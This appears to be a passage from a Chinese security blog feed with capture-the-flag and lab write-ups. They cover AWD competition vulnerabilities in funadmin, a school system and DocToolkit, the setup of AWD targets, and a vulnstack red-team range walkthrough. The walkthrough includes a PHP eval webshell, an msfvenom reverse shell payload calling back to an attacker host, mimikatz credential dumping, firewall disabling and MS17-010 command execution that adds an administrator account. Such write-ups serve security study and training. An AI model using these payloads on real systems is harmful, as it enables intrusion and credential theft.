class="hljs-operator">=</span>&#123;&#x27;a&#x27;:&#x27;cat <span class="hljs-operator">/</span>flag.txt&#x27;&#125;<br>    c<span class="hljs-operator">=</span>requests.post(url,data)<br>    <span class="hljs-keyword">if</span>  c.status_code <span class="hljs-operator">==</span> <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(url)<br>        <span class="hljs-built_in">print</span>(c.text)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>长城杯 AWD</title>
    <link href="/2024/07/17/ccb/"/>
    <url>/2024/07/17/ccb/</url>
    
    <content type="html"><![CDATA[<h1 id="funadmin"><a href="#funadmin" class="headerlink" title="funadmin"></a>funadmin</h1><h2 id="漏洞1："><a href="#漏洞1：" class="headerlink" title="漏洞1："></a>漏洞1：</h2><p>/app/api/controller/v1/Token.php存在一句话木马</p><p><img src="/2024/07/17/ccb/image-20240917161604032.png" alt="image-20240917161604032"></p><h2 id="漏洞2：任意文件读取"><a href="#漏洞2：任意文件读取" class="headerlink" title="漏洞2：任意文件读取"></a>漏洞2：任意文件读取</h2><p>app/frontend/controller/Ajax.php存在文件读取</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">frontend<span class="hljs-regexp">/Ajax/g</span>etfile?<span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>flag<br></code></pre></td></tr></table></figure><p><img src="/2024/07/17/ccb/image-20240917161615348.png" alt="image-20240917161615348"></p><h2 id="漏洞3：phtml文件上传"><a href="#漏洞3：phtml文件上传" class="headerlink" title="漏洞3：phtml文件上传"></a>漏洞3：phtml文件上传</h2><p>后台用户头像抓包修改可上传phtml文件</p><p><img src="/2024/07/17/ccb/image-20240917161625669.png" alt="image-20240917161625669"></p><h2 id="漏洞4：后台任意文件上传"><a href="#漏洞4：后台任意文件上传" class="headerlink" title="漏洞4：后台任意文件上传"></a>漏洞4：后台任意文件上传</h2><p>离线上传一个包含木马的zip文件，木马会被解压放到addons目录</p><p><img src="/2024/07/17/ccb/image-20240917161635264.png" alt="image-20240917161635264"></p><p>首页cookie文件包含</p><p><img src="/2024/07/17/ccb/image-20240917161644955.png" alt="image-20240917161644955"></p><h2 id="漏洞5：信息泄露"><a href="#漏洞5：信息泄露" class="headerlink" title="漏洞5：信息泄露"></a>漏洞5：信息泄露</h2><p>首页源代码泄露admin账户密码</p><p><img src="/2024/07/17/ccb/image-20240917161653436.png" alt="image-20240917161653436"></p><p>参考<a href="https://www.qwesec.com/2024/05/changchengcup.html">https://www.qwesec.com/2024/05/changchengcup.html</a></p><h1 id="教务系统"><a href="#教务系统" class="headerlink" title="教务系统"></a>教务系统</h1><h2 id="漏洞一：命令执行"><a href="#漏洞一：命令执行" class="headerlink" title="漏洞一：命令执行"></a>漏洞一：命令执行</h2><p>forget.jsp存在命令执行</p><p><img src="/2024/07/17/ccb/image-20240909162053704.png" alt="image-20240909162053704"></p><p>验证</p><p><img src="/2024/07/17/ccb/image-20240909162159781.png" alt="image-20240909162159781"></p><h2 id="漏洞二：后台头像任意文件上传"><a href="#漏洞二：后台头像任意文件上传" class="headerlink" title="漏洞二：后台头像任意文件上传"></a>漏洞二：后台头像任意文件上传</h2><p>sql文件泄露教师账户密码，登录上传jsp马</p><p><img src="/2024/07/17/ccb/image-20240909163336435.png" alt="image-20240909163336435"></p><p><img src="/2024/07/17/ccb/image-20240909163415171.png" alt="image-20240909163415171"></p><h2 id="漏洞三：登录页面sql注入"><a href="#漏洞三：登录页面sql注入" class="headerlink" title="漏洞三：登录页面sql注入"></a>漏洞三：登录页面sql注入</h2><p>账户密码可用万能密码1’ or ‘1’=’1登录</p><p><img src="/2024/07/17/ccb/image-20240909170401033.png" alt="image-20240909170401033"></p><p>账户密码直接接入sql语句</p><h2 id="漏洞四：密码修改越权"><a href="#漏洞四：密码修改越权" class="headerlink" title="漏洞四：密码修改越权"></a>漏洞四：密码修改越权</h2><p>可根据id修改其他同类用户密码</p><p><img src="/2024/07/17/ccb/image-20240909173800193.png" alt="image-20240909173800193"></p><h1 id="DocToolkit"><a href="#DocToolkit" class="headerlink" title="DocToolkit"></a>DocToolkit</h1><h2 id="漏洞一：后门"><a href="#漏洞一：后门" class="headerlink" title="漏洞一：后门"></a>漏洞一：后门</h2><p><img src="/2024/07/17/ccb/image-20240909175604238.png" alt="image-20240909175604238"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/test/backd0or?cmd=<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure><h2 id="漏洞二：shiro反序列化"><a href="#漏洞二：shiro反序列化" class="headerlink" title="漏洞二：shiro反序列化"></a>漏洞二：shiro反序列化</h2><p>在jar包里找到密钥</p><p><img src="/2024/07/17/ccb/image-20240909175108987.png" alt="image-20240909175108987"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>AWD搭建</title>
    <link href="/2024/06/29/AWD%E6%90%AD%E5%BB%BA/"/>
    <url>/2024/06/29/AWD%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>本次搭建awd靶机为ciscn华中awd靶机</p><h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><p>知识点：栈溢出，格式化字符串，SUID提权</p><p>比赛时这个靶机pwn工作目录放在了根目录，找个pwn靶机环境（</p><p>），安装好ssh，并设置ctf用户登录，再给find命令SUID权限</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">chmod u+s <span class="hljs-built_in">find</span><br></code></pre></td></tr></table></figure><p>比赛靶机pwn工作目录放在了根目录，用户目录又存在usr目录，没看懂</p><h1 id="gaatitrack"><a href="#gaatitrack" class="headerlink" title="gaatitrack"></a>gaatitrack</h1><p>环境：ubuntu18.04，apache2，mysql5.7，php7.2</p><p>这样我采用的是从头搭建，换源后安装ssh、apache2，mysql5.7，php7.2，</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> install -y openssh-server<br>apt-<span class="hljs-built_in">get</span> install apache2<br>apt-<span class="hljs-built_in">get</span> install mysql-server<br>apt-<span class="hljs-built_in">get</span> install php7.2<br>apt install php-fpm<br></code></pre></td></tr></table></figure><p>同样添加ctf用户，用于连ssh，root也行。安装好后配置好apache2、mysql，由于mysql是新装，所以要设置root的一些配置，授权，修改加密规则等等，</p><p>把网站文件放在/var/www/html，导入数据库文件，把apapche2，mysql都开启就可以访问了，如果访问失败或者网页空白，检查下/var/log目录下两者的日志文件，查看错误原因。</p><p>mysql注释掉 bind-address = 127.0.0.1</p><p><img src="/2024/06/29/AWD%E6%90%AD%E5%BB%BA/image-20240629101354724.png" alt="image-20240629101354724"></p><p>当然如果只是复现环境，建议直接用小皮面板，导入数据库后，把文件放在www目录下就可以直接访问了</p><h1 id="warehouse"><a href="#warehouse" class="headerlink" title="warehouse"></a>warehouse</h1><p>java+mysql设置好开机运行jar</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ATT-CK红队评估实战内网靶场(一)</title>
    <link href="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/"/>
    <url>/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/#base">漏洞详情 (qiyuanxuetang.net)</a></p><p>Web服务器：Windows7（配有phpstudy，需要自启）（网络配置：仅主机+NAT）</p><p>域内主机：Win2K3 Metasploitable（启动时，vm tools出现提示，不用管，全部否或关掉）（网络配置：仅主机）</p><p>域控：Windows 2008（网络配置：仅主机）</p><p>默认密码均为：hongrisec@2019，修改密码自定</p><p>Windows7：192.168.232.132  192.168.52.143</p><p>Windows server 2008 : 192.168.52.138</p><p>Win2K3 Metasploitable : 192.168.52.141</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>发现Win7外网ip</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240607203834206.png" alt="image-20240607203834206"></p><p>扫描ip，发现有关端口</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240607203858402.png" alt="image-20240607203858402"></p><h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><h2 id="phpmyadmin注马"><a href="#phpmyadmin注马" class="headerlink" title="phpmyadmin注马"></a>phpmyadmin注马</h2><p>访问80端口</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240607204449840.png" alt="image-20240607204449840"></p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240607214350486.png" alt="image-20240607214350486"></p><p>数据库密码为root，mysql远程连不上<img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240607214618332.png" alt="image-20240607214618332"></p><p>扫描目录发现，/phpmyadmin</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240607205213977.png" alt="image-20240607205213977"></p><p>登录得到</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240607214802116.png" alt="image-20240607214802116"></p><p>phpmyadmin后台getshell的常用手段有以下几种方式：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1</span>、<span class="hljs-keyword">select</span> <span class="hljs-keyword">into</span> outfile直接写入<br><span class="hljs-number">2</span>、开启全局日志getshell<br><span class="hljs-number">3</span>、使用慢查询日志getsehll<br><span class="hljs-number">4</span>、使用错误日志getshell<br><span class="hljs-number">5</span>、利用phpmyadmin4<span class="hljs-number">.8</span>.x本地文件包含漏洞getshell<br></code></pre></td></tr></table></figure><p>执行sql语句</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%secure%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240607225303935.png" alt="image-20240607225303935"></p><p>发现没有写入权限，无法用select into outfile方法写入shell,只能使用第二种方法</p><p>开启日志功能</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> global <span class="hljs-attribute">general_log</span>=<span class="hljs-string">&#x27;on&#x27;</span>;<br></code></pre></td></tr></table></figure><p>修改日志保存路径为<code>C:/phpStudy/WWW/shell.php</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> global <span class="hljs-attribute">general_log_file</span>=<span class="hljs-string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span><br></code></pre></td></tr></table></figure><p>修改成功</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240607230543202.png" alt="image-20240607230543202"></p><p>注马</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">SELECT &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;</span><br></code></pre></td></tr></table></figure><p>蚁剑成功连接</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240608103504691.png" alt="image-20240608103504691"></p><p>连接后发现还有个yxcms，这里看到有师傅是直接通过cms来getshell，但是我没扫出来yxcms的目录，但是扫出来cms的压缩包，下载解压可以得到，于是猜测还有yxcms,另外数据库里有个newyxcms,去尝试猜也可能得到。</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240607220357338.png" alt="image-20240607220357338"></p><h2 id="yxcms注马"><a href="#yxcms注马" class="headerlink" title="yxcms注马"></a>yxcms注马</h2><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240608112001809.png" alt="image-20240608112001809"></p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240608104001172.png" alt="image-20240608104001172"></p><p>现在要找到acomment.php，可以通过目录遍历，但是这里建议直接通过之前的cms压缩包解压出来直接搜索</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240608111944345.png" alt="image-20240608111944345"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>蚁剑虚拟终端ipconfig查看</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923110315192.png" alt="image-20240923110315192"></p><p>发现内网c段</p><h2 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h2><p>Cobalt Strike设置监听端口</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923172425918.png" alt="image-20240923172425918"></p><p>上传木马</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923173509196.png" alt="image-20240923173509196"></p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923173529518.png" alt="image-20240923173529518"></p><p>进行提权</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923200402756.png" alt="image-20240923200402756"></p><p>得到system权限</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923200610165.png" alt="image-20240923200610165"></p><p>执行net view查看域控主机</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923201104035.png" alt="image-20240923201104035"></p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pf">查看防火墙状态<br>shell netsh firewall show <span class="hljs-keyword">state</span><br><span class="hljs-comment"># 关闭防火墙 </span><br>shell netsh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off<br></code></pre></td></tr></table></figure><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">mimikatz sekurlsa::logonpasswords  <span class="hljs-meta">#获取密码</span><br></code></pre></td></tr></table></figure><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923202816670.png" alt="image-20240923202816670"></p><p>成功控制 Windows server 2008</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923203217735.png" alt="image-20240923203217735"></p><h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>kali生成msf木马，蚁剑上传</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.232.134 <span class="hljs-attribute">LPORT</span>=4444 -f exe -o msf.exe<br></code></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 192.168.232.134</span> <br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 4444</span> <br>run<br></code></pre></td></tr></table></figure><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923215211366.png" alt="image-20240923215211366"></p><p>执行<code>getuid</code>查看当前权限，然后<code>getsystem</code>提为system权限</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923215503247.png" alt="image-20240923215503247"></p><p>查看端口，发现没有开启3389端口</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923215711180.png" alt="image-20240923215711180"></p><p>执行<code>run post/windows/manage/enable_rdp</code>开启3389端口</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923215753637.png" alt="image-20240923215753637"></p><p>kali执行命令<code>rdesktop 192.168.232.132</code></p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923215951985.png" alt="image-20240923215951985"></p><p>执行<code>load mimikatz</code>，发现只能用kiwi</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923221918780.png" alt="image-20240923221918780"></p><p>查看靶机是64位还是32位</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923222109516.png" alt="image-20240923222109516"></p><p>执行<code>migrate  488</code>，迁移进程</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">creds_all</span>  <span class="hljs-comment">#列举所有凭据</span><br></code></pre></td></tr></table></figure><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923222404162.png" alt="image-20240923222404162"></p><p>得到密码，即可远程登录</p><p><code>run post/windows/gather/enum_applications</code>查看win7上安装了哪些软件</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923223526795.png" alt="image-20240923223526795"></p><p><code>arp -a</code>查看路由表，发现域内主机</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240924163524009.png" alt="image-20240924163524009"></p><p><code>run autoroute -s 192.168.52.0/24</code>添加录路由；</p><p><code>run autoroute -p</code>查看路由；</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240924163633397.png" alt="image-20240924163633397"></p><p>设置代理</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use auxiliary/server/socks_proxy<br><span class="hljs-keyword">set</span> srvhost <span class="hljs-comment">192.168.232.134</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">srvport 1080</span><br>run<br></code></pre></td></tr></table></figure><p>修改 /etc/proxychains4.conf ,最后一行改为socks4 192.168.232.134 1080</p><p>这里没显示连接失败，但代理能访问</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20241013220154092.png" alt="image-20241013220154092"></p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20241013220208178.png" alt="image-20241013220208178"></p><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>扫描系统版本，是Windows2003</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> auxiliary/scanner/smb/smb_version<br><span class="hljs-keyword">set</span> rhosts 192.168.52.141<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20241014161935857.png" alt="image-20241014161935857"></p><p>验证发现存在永恒之蓝漏洞；</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> auxiliary/scanner/smb/smb_ms17_010<br><span class="hljs-keyword">set</span> rhost 192.168.52.141<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20241014162213295.png" alt="image-20241014162213295"></p><p><code>exploit/windows/smb/ms17_010_eternalblue</code>打不了，但是可以使用<br><code>auxiliary/admin/smb/ms17_010_command</code>模块执行命令；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/admin/smb/ms17_010_command<br><span class="hljs-built_in">set</span> rhosts 192.168.52.141<br><span class="hljs-built_in">set</span> <span class="hljs-built_in">command</span> <span class="hljs-built_in">whoami</span><br>run<br></code></pre></td></tr></table></figure><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20241014162230872.png" alt="image-20241014162230872"></p><p>远程登录</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span> net user blckder02 8888! <span class="hljs-string">/add</span>  <span class="hljs-comment">#添加用户；</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span> net localgroup administrators blckder02 <span class="hljs-string">/add</span>  <span class="hljs-comment">#添加管理员权限；</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span> &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-string">/v</span> fDenyTSConnections <span class="hljs-string">/t</span> REG_DWORD <span class="hljs-string">/d</span> 00000000 <span class="hljs-string">/f</span>&#x27;  <span class="hljs-comment">#执行命令开启3389端口，这里要么用单引号把命令引住，要么用反斜杠对反斜杠和引号进行转义，否则会出错；</span><br>run<br>proxychains rdesktop 192.168.52.141  <span class="hljs-comment">#远程桌面连接成功，可以用添加的用户进行登录；</span><br></code></pre></td></tr></table></figure><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20241014164211502.png" alt="image-20241014164211502"></p><p>反弹shell</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/windows/smb/ms17_010_psexec<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">bind_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhosts 192.168.52.141</span><br>run<br></code></pre></td></tr></table></figure><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20241014165413031.png" alt="image-20241014165413031"></p><p>这里可能是之前代理的问题，都没有成功</p><p>另一个靶机同理</p><p>参考：</p><p><a 